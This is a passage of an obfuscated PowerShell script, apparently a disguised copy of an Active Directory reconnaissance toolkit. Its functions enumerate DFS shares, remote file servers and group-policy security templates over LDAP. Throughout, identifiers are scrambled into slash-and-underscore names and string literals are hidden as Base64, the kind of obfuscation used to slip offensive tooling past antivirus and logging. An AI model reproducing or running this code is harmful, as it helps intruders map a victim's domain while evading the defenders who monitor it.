            ${/===\/\/\_____/\/} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
            $(ForEach(${/=\/==\/==\__/\/=} in ${/===\/\/\_____/\/}.FindAll()) {if (${/=\/==\/==\__/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))]) {_/\____/=\_/==\___(${/=\/==\/==\__/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))])}if (${/=\/==\/==\__/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))]) {_/\____/=\_/==\___(${/=\/==\/==\__/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))])}if (${/=\/==\/==\__/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))]) {_/\____/=\_/==\___(${/=\/==\/==\__/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))])}}) | sort -Unique
        }
    }
}
function Get-DomainDFSShare {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $Version = 'All'
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        function ______/\/=\/==\/\/ {
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${_/=\/===\/\/==\_/=}
            )
            ${/=\_/\/\/==\___/=} = ${_/=\/===\/\/==\_/=}
            ${_/\_/\/\/\/\__/=\} = [bitconverter]::ToUInt32(${/=\_/\/\/==\___/=}[0..3],0)
            ${/===\/====\/\/\/\} = [bitconverter]::ToUInt32(${/=\_/\/\/==\___/=}[4..7],0)
            ${_/=\/\_/\/=\_____/} = 8
            ${/====\_/\_/=====\} = @()
            for(${_/\/\__/=\/==\/\_}=1; ${_/\/\__/=\/==\/\_} -le ${/===\/====\/\/\/\}; ${_/\/\__/=\/==\/\_}++){
                ${/=\/=\/\/\/=\__/\} = ${_/=\/\_/\/=\_____/}
                ${_/=\__/=\_/=\__/=} = ${_/=\/\_/\/=\_____/} + 1
                ${/==\/==\/\/\/\___} = [bitconverter]::ToUInt16(${/=\_/\/\/==\___/=}[${/=\/=\/\/\/=\__/\}..${_/=\__/=\_/=\__/=}],0)
                ${__/=\/=\/===\_/==} = ${_/=\__/=\_/=\__/=} + 1
                ${__/=\_____/=\/\/\} = ${__/=\/=\/===\_/==} + ${/==\/==\/\/\/\___} - 1
                ${__/===\/=\/\_/\__} = [System.Text.Encoding]::Unicode.GetString(${/=\_/\/\/==\___/=}[${__/=\/=\/===\_/==}..${__/=\_____/=\/\/\}])
                ${_/\/\/\/=\____/=\} = ${__/=\_____/=\/\/\} + 1
                ${/=\/==\_/\_____/=} = ${_/\/\/\/=\____/=\} + 3
                ${_/==\/==\_/=\__/=} = [bitconverter]::ToUInt32(${/=\_/\/\/==\___/=}[${_/\/\/\/=\____/=\}..${/=\/==\_/\_____/=}],0)
                ${___/\/\_/\__/=\/=} = ${/=\/==\_/\_____/=} + 1
                ${___/\_/==\_/\__/\} = ${___/\/\_/\__/=\/=} + ${_/==\/==\_/=\__/=} - 1
                ${/\_____/\___/\/\_} = ${/=\_/\/\/==\___/=}[${___/\/\_/\__/=\/=}..${___/\_/==\_/\__/\}]
                switch -wildcard (${__/===\/=\/\_/\__}) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABzAGkAdABlAHIAbwBvAHQA'))) {  }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABkAG8AbQBhAGkAbgByAG8AbwB0ACoA'))) {
                        ${/==\_/=\_/\_/\_/\} = 0
                        ${/=\__/\/===\/==\/} = 15
                        ${/=\/\/\/\/==\/==\} = [byte[]]${/\_____/\___/\/\_}[${/==\_/=\_/\_/\_/\}..${/=\__/\/===\/==\/}]
                        ${/===\/\__/===\/=\} = New-Object Guid(,${/=\/\/\/\/==\/==\}) 
                        ${_/===\_/\__/\_/==} = ${/=\__/\/===\/==\/} + 1
                        ${/=\/\/\_/=\/\/\/=} = ${_/===\_/\__/\_/==} + 1
                        ${/==\___/\/=======} = [bitconverter]::ToUInt16(${/\_____/\___/\/\_}[${_/===\_/\__/\_/==}..${/=\/\/\_/=\/\/\/=}],0)
                        ${_/\__/\__/=\/=\__} = ${/=\/\/\_/=\/\/\/=} + 1
                        ${/=\/=\/==\__/==\/} = ${_/\__/\__/=\/=\__} + ${/==\___/\/=======} - 1
                        ${_/===\_/=\/==\___} = [System.Text.Encoding]::Unicode.GetString(${/\_____/\___/\/\_}[${_/\__/\__/=\/=\__}..${/=\/=\/==\__/==\/}])
                        ${_/\___/\/\/\/==\/} = ${/=\/=\/==\__/==\/} + 1
                        ${_/\/=\__/==\_/\/\} = ${_/\___/\/\/\/==\/} + 1
                        ${___/==\__/===\/=\} = [bitconverter]::ToUInt16(${/\_____/\___/\/\_}[${_/\___/\/\/\/==\/}..${_/\/=\__/==\_/\/\}],0)
                        ${___/\__/\_/=\/=\_} = ${_/\/=\__/==\_/\/\} + 1
                        ${___/\/\_/=\/===\/} = ${___/\__/\_/=\/=\_} + ${___/==\__/===\/=\} - 1
                        ${/===\/=\__/==\__/} = [System.Text.Encoding]::Unicode.GetString(${/\_____/\___/\/\_}[${___/\__/\_/=\/=\_}..${___/\/\_/=\/===\/}])
                        ${_/===\_/\_/=\__/\} = ${___/\/\_/=\/===\/} + 1
                        ${_/\_/=\/=\______/} = ${_/===\_/\_/=\__/\} + 3
                        ${__/==\/\/=\__/=\__} = [bitconverter]::ToUInt32(${/\_____/\___/\/\_}[${_/===\_/\_/=\__/\}..${_/\_/=\/=\______/}],0)
                        ${__/\/=\/\/\/\__/=} = ${_/\_/=\/=\______/} + 1
                        ${/=\__/==\/\/\/=\_} = ${__/\/=\/\/\/\__/=} + 3
                        ${_/=\__/\____/=\/\} = [bitconverter]::ToUInt32(${/\_____/\___/\/\_}[${__/\/=\/\/\/\__/=}..${/=\__/==\/\/\/=\_}],0)
                        ${/====\/=\__/=\/\_} = ${/=\__/==\/\/\/=\_} + 1
                        ${___/\/\/\/=\__/=\} = ${/====\/=\__/=\/\_} + 1
                        ${/=\_/\/\_/====\/\} = [bitconverter]::ToUInt16(${/\_____/\___/\/\_}[${/====\/=\__/=\/\_}..${___/\/\/\/=\__/=\}],0)
                        ${__/\/\/=\__/\_/==} = ${___/\/\/\/=\__/=\} + 1
                        ${/=\/\/==\/\_/\___} = ${__/\/\/=\__/\_/==} + ${/=\_/\/\_/====\/\} - 1
                        if (${/=\_/\/\_/====\/\} -gt 0)  {
                            ${_/\/\/=\_/===\/=\} = [System.Text.Encoding]::Unicode.GetString(${/\_____/\___/\/\_}[${__/\/\/=\__/\_/==}..${/=\/\/==\/\_/\___}])
                        }
                        ${_/\/\_/\_/=\/\___} = ${/=\/\/==\/\_/\___} + 1
                        ${___/====\/\/\____} = ${_/\/\_/\_/=\/\___} + 7
                        ${___/\/=====\/=\__} = ${/\_____/\___/\/\_}[${_/\/\_/\_/=\/\___}..${___/====\/\/\____}] 
                        ${_/=\__/\_/\/\/\_/} = ${___/====\/\/\____} + 1
                        ${_/===\_/\/=\/\___} = ${_/=\__/\_/\/\/\_/} + 7
                        ${_________/\__/=\_} = ${/\_____/\___/\/\_}[${_/=\__/\_/\/\/\_/}..${_/===\_/\/=\/\___}]
                        ${___/=\/\_/===\/=\} = ${_/===\_/\/=\/\___} + 1
                        ${_/\/==\/\/==\__/\} = ${___/=\/\_/===\/=\} + 7
                        ${__/====\/=\/==\/\} = ${/\_____/\___/\/\_}[${___/=\/\_/===\/=\}..${_/\/==\/\/==\__/\}]
                        ${_/\_/\_/\_/\/==\_} = ${_/\/==\/\/==\__/\}  + 1
                        ${_/=\____/\/\/\/==} = ${_/\_/\_/\_/\/==\_} + 3
                        $version = [bitconverter]::ToUInt32(${/\_____/\___/\/\_}[${_/\_/\_/\_/\/==\_}..${_/=\____/\/\/\/==}],0)
                        ${_/==\/\/==\/\_/=\} = ${_/=\____/\/\/\/==} + 1
                        ${__/==\/\______/=\} = ${_/==\/\/==\/\_/=\} + 3
                        ${/===\___/\_/=\_/\} = [bitconverter]::ToUInt32(${/\_____/\___/\/\_}[${_/==\/\/==\/\_/=\}..${__/==\/\______/=\}],0)
                        ${_/\___/\_______/\} = ${__/==\/\______/=\} + 1
                        ${_/\/==\/==\/\_/\/} = ${_/\___/\_______/\} + ${/===\___/\_/=\_/\} - 1
                        ${_/=\__/\/=\_/\_/=} = ${/\_____/\___/\/\_}[${_/\___/\_______/\}..${_/\/==\/==\/\_/\/}]
                        ${__/=\__/\/\_/\/\_} = ${_/\/==\/==\/\_/\/} + 1
                        ${_/=====\/\/\/\_/\} = ${__/=\__/\/\_/\/\_} + 3
                        ${__/==\_/===\_/===} = [bitconverter]::ToUInt32(${/\_____/\___/\/\_}[${__/=\__/\/\_/\/\_}..${_/=====\/\/\/\_/\}],0)
                        ${/=\______/==\/\/\} = ${_/=====\/\/\/\_/\} + 1
                        ${_/\_/\_/\/==\/\/\} = ${/=\______/==\/\/\} + ${__/==\_/===\_/===} - 1
                        ${/====\/\_____/\/\} = ${/\_____/\___/\/\_}[${/=\______/==\/\/\}..${_/\_/\_/\/==\/\/\}]
                        ${/=\/\__/=\/\___/=} = ${_/\_/\_/\/==\/\/\} + 1
                        ${_/\/=\_/=\/\_/\__} = ${/=\/\__/=\/\___/=} + 3
                        ${__/=\/===\__/=\/\} = [bitconverter]::ToUInt32(${/\_____/\___/\/\_}[${/=\/\__/=\/\___/=}..${_/\/=\_/=\/\_/\__}],0)
                        ${__/\/\_/\__/=\___} = 0
                        ${/=\_/=\/\/\_/\/==} = ${__/\/\_/\__/=\___} + 3
                        ${/=\/==\/==\/\____} = [bitconverter]::ToUInt32(${_/=\__/\/=\_/\_/=}[${__/\/\_/\__/=\___}..${/=\_/=\/\/\_/\/==}],0)
                        ${/=\_/\_/====\_/\_} = ${/=\_/=\/\/\_/\/==} + 1
                        for(${/=\__/=\__/\__/==}=1; ${/=\__/=\__/\__/==} -le ${/=\/==\/==\/\____}; ${/=\__/=\__/\__/==}++){
                            ${_/\_____/\/=\_/=\} = ${/=\_/\_/====\_/\_}
                            ${____/\/\_/\/\/==\} = ${_/\_____/\/=\_/=\} + 3
                            ${/=\___/=\/==\/=\_} = [bitconverter]::ToUInt32(${_/=\__/\/=\_/\_/=}[${_/\_____/\/=\_/=\}..${____/\/\_/\/\/==\}],0)
                            ${___/=\/\/=\/==\__} = ${____/\/\_/\/\/==\} + 1
                            ${/===\/=\_/\__/=\_} = ${___/=\/\/=\/==\__} + 7
                            ${_/\/=\/\_/\/\/\/\} = ${_/=\__/\/=\_/\_/=}[${___/=\/\/=\/==\__}..${/===\/=\_/\__/=\_}]
                            ${_____/\_/\_/=\___} = ${/===\/=\_/\__/=\_} + 1
                            ${___/=\_/\/\/\__/\} = ${_____/\_/\_/=\___} + 3
                            ${/====\___/\/\_/==} = [bitconverter]::ToUInt32(${_/=\__/\/=\_/\_/=}[${_____/\_/\_/=\___}..${___/=\_/\/\/\__/\}],0)
                            ${/===\_/\/\__/\/==} = ${___/=\_/\/\/\__/\} + 1
                            ${/==\/====\/\/====} = ${/===\_/\/\__/\/==} + 3
                            ${____/\__/=\/=\/\_} = [bitconverter]::ToUInt32(${_/=\__/\/=\_/\_/=}[${/===\_/\/\__/\/==}..${/==\/====\/\/====}],0)
                            ${___/==\______/===} = ${/==\/====\/\/====} + 1
                            ${_/\/===\_/\/=\_/=} = ${___/==\______/===} + 1
                            ${__/\_/=\/=\_/\_/\} = [bitconverter]::ToUInt16(${_/=\__/\/=\_/\_/=}[${___/==\______/===}..${_/\/===\_/\/=\_/=}],0)
                            ${___/==\_/=\/\_/\/} = ${_/\/===\_/\/=\_/=} + 1
                            ${/==\/=\/====\/\/=} = ${___/==\_/=\/\_/\/} + ${__/\_/=\/=\_/\_/\} - 1
                            ${___/===\_/==\/===} = [System.Text.Encoding]::Unicode.GetString(${_/=\__/\/=\_/\_/=}[${___/==\_/=\/\_/\/}..${/==\/=\/====\/\/=}])
                            ${_/==\/=\/\/\_/\_/} = ${/==\/=\/====\/\/=} + 1
                            ${____/\/=\___/\_/=} = ${_/==\/=\/\/\_/\_/} + 1
                            ${/==\/=\_/=\/=\__/} = [bitconverter]::ToUInt16(${_/=\__/\/=\_/\_/=}[${_/==\/=\/\/\_/\_/}..${____/\/=\___/\_/=}],0)
                            ${/==\/=\/\_/=\___/} = ${____/\/=\___/\_/=} + 1
                            ${____/=\_/=====\/=} = ${/==\/=\/\_/=\___/} + ${/==\/=\_/=\/=\__/} - 1
                            ${____/==\/=\/=\__/} = [System.Text.Encoding]::Unicode.GetString(${_/=\__/\/=\_/\_/=}[${/==\/=\/\_/=\___/}..${____/=\_/=====\/=}])
                            ${_/\/\/=\__/==\_/=} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewBfAF8AXwAvAD0APQA9AFwAXwAvAD0APQBcAC8APQA9AD0AfQBcACQAewBfAF8AXwBfAC8APQA9AFwALwA9AFwALwA9AFwAXwBfAC8AfQA=')))
                            ${/=\_/\_/====\_/\_} = ${____/=\_/=====\/=} + 1
                        }
                    }
                }
                ${_/=\/\_/\/=\_____/} = ${___/\_/==\_/\__/\} + 1
                ${_/=\_/\_/=\_/\_/=} = @{
                    'Name' = ${__/===\/=\/\_/\__}
                    'Prefix' = ${_/===\_/=\/==\___}
                    'TargetList' = ${_/\/\/=\__/==\_/=}
                }
                ${/====\_/\_/=====\} += New-Object -TypeName PSObject -Property ${_/=\_/\_/=\_/\_/=}
                ${_/===\_/=\/==\___} = $Null
                ${__/===\/=\/\_/\__} = $Null
                ${_/\/\/=\__/==\_/=} = $Null
            }
            ${/=\__/\/======\/\} = @()
            ${/====\_/\_/=====\} | % {
                if ($_.TargetList) {
                    $_.TargetList | % {
                        ${/=\__/\/======\/\} += $_.split('\')[2]
                    }
                }
            }
            ${/=\__/\/======\/\}
        }
        function _/===\/=====\/=\_/ {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,
                [String]
                $SearchBase,
                [String]
                $Server,
                [String]
                $SearchScope = 'Subtree',
                [Int]
                $ResultPageSize = 200,
                [Int]
                $ServerTimeLimit,
                [Switch]
                $Tombstone,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )
            ${/=\/=======\/===\} = _/=\_/=\_/==\_/\/\ @PSBoundParameters
            if (${/=\/=======\/===\}) {
                ${/=\_/=====\/\____} = @()
                ${/=\/=======\/===\}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AZgBUAEQAZgBzACkAKQA=')))
                try {
                    ${_/\__/\/=====\_/\} = ${/=\/=======\/===\}.FindAll()
                    ${_/\__/\/=====\_/\} | ? {$_} | % {
                        $Properties = $_.Properties
                        ${_/===\/=\__/==\/\} = $Properties.remoteservername
                        ${_/=\/===\/\/==\_/=} = $Properties.pkt
                        ${/=\_/=====\/\____} += ${_/===\/=\__/==\/\} | % {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAaQBuACAAcABhAHIAcwBpAG4AZwAgAEQARgBTACAAcwBoAGEAcgBlACAAOgAgACQAXwA=')))
                            }
                        }
                    }
                    if (${_/\__/\/=====\_/\}) {
                        try { ${_/\__/\/=====\_/\}.dispose() }
                        catch {
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                        }
                    }
                    ${/=\/=======\/===\}.dispose()
                    if (${_/=\/===\/\/==\_/=} -and ${_/=\/===\/\/==\_/=}[0]) {
                        ______/\/=\/==\/\/ ${_/=\/===\/\/==\_/=}[0] | % {
                            if ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB1AGwAbAA=')))) {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAOgAgACQAXwA=')))
                }
                ${/=\_/=====\/\____} | sort -Unique -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
            }
        }
        function __/\/\_/==\_/==\/= {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,
                [String]
                $SearchBase,
                [String]
                $Server,
                [String]
                $SearchScope = 'Subtree',
                [Int]
                $ResultPageSize = 200,
                [Int]
                $ServerTimeLimit,
                [Switch]
                $Tombstone,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )
            ${/=\/=======\/===\} = _/=\_/=\_/==\_/\/\ @PSBoundParameters
            if (${/=\/=======\/===\}) {
                ${/=\_/=====\/\____} = @()
                ${/=\/=======\/===\}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AbQBzAEQARgBTAC0ATABpAG4AawB2ADIAKQApAA==')))
                $Null = ${/=\/=======\/===\}.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAZgBzAC0AbABpAG4AawBwAGEAdABoAHYAMgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAEQARgBTAC0AVABhAHIAZwBlAHQATABpAHMAdAB2ADIA')))))
                try {
                    ${_/\__/\/=====\_/\} = ${/=\/=======\/===\}.FindAll()
                    ${_/\__/\/=====\_/\} | ? {$_} | % {
                        $Properties = $_.Properties
                        ${_/\/\/=\__/==\_/=} = $Properties.'msdfs-targetlistv2'[0]
                        ${__/\___/=\_/==\/=} = [xml][System.Text.Encoding]::Unicode.GetString(${_/\/\/=\__/==\_/=}[2..(${_/\/\/=\__/==\_/=}.Length-1)])
                        ${/=\_/=====\/\____} += ${__/\___/=\_/==\/=}.targets.ChildNodes | % {
                            try {
                                ${/==\__/====\/===\} = $_.InnerText
                                if ( ${/==\__/====\/===\}.Contains('\') ) {
                                    ${_/\__/====\_/====} = ${/==\__/====\/===\}.split('\')[3]
                                    ${_/=\/\/\/\___/\/\} = $Properties.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAF8AXwAvAD0APQA9AD0AXABfAC8APQA9AD0APQB9ACQAewBfAC8APQBcAC8AXAAvAFwALwBcAF8AXwBfAC8AXAAvAFwAfQA=')));'RemoteServerName'=${/==\__/====\/===\}.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAyACAAZQByAHIAbwByACAAaQBuACAAcABhAHIAcwBpAG4AZwAgAHQAYQByAGcAZQB0ACAAOgAgACQAXwA=')))
                            }
                        }
                    }
                    if (${_/\__/\/=====\_/\}) {
                        try { ${_/\__/\/=====\_/\}.dispose() }
                        catch {
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                        }
                    }
                    ${/=\/=======\/===\}.dispose()
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAyACAAZQByAHIAbwByACAAOgAgACQAXwA=')))
                }
                ${/=\_/=====\/\____} | sort -Unique -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
            }
        }
    }
    PROCESS {
        ${/=\_/=====\/\____} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ForEach ($TargetDomain in $Domain) {
                ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain
                if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAxAA==')))) {
                    ${/=\_/=====\/\____} += _/===\/=====\/=\_/ @_/\/\/\/\___/\/\/
                }
                if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAyAA==')))) {
                    ${/=\_/=====\/\____} += __/\/\_/==\_/==\/= @_/\/\/\/\___/\/\/
                }
            }
        }
        else {
            if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAxAA==')))) {
                ${/=\_/=====\/\____} += _/===\/=====\/=\_/ @_/\/\/\/\___/\/\/
            }
            if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAyAA==')))) {
                ${/=\_/=====\/\____} += __/\/\_/==\_/==\/= @_/\/\/\/\___/\/\/
            }
        }
        ${/=\_/=====\/\____} | sort -Property ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))) -Unique
    }
}
function ____/==\/\/\/\__/= {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        ${/===\/\/\_/\____/},
        [Switch]
        ${__/\/\_/=\/===\/\/},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${____/\_____/===\/} = @{}
    }
    PROCESS {
        try {
            if ((${/===\/\/\_/\____/} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${_/=\__/=\_/\/=\/=} = "\\$((New-Object System.Uri(${/===\/\/\_/\____/})).Host)\SYSVOL"
                if (-not ${____/\_____/===\/}[${_/=\__/=\_/\/=\/=}]) {
                    _/=\____/\/\/=\__/ -Path ${_/=\__/=\_/\/=\/=} -Credential $Credential
                    ${____/\_____/===\/}[${_/=\__/=\_/\/=\/=}] = $True
                }
            }
            ${_/=\/=\_/\__/\/=\} = ${/===\/\/\_/\____/}
            if (-not ${_/=\/=\_/\__/\/=\}.EndsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBpAG4AZgA='))))) {
                ${_/=\/=\_/\__/\/=\} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAcAB0AFQAbQBwAGwAXQAgAFAAYQByAHMAaQBuAGcAIABHAHAAdABUAG0AcABsAFAAYQB0AGgAOgAgACQAewBfAC8APQBcAC8APQBcAF8ALwBcAF8AXwAvAFwALwA9AFwAfQA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
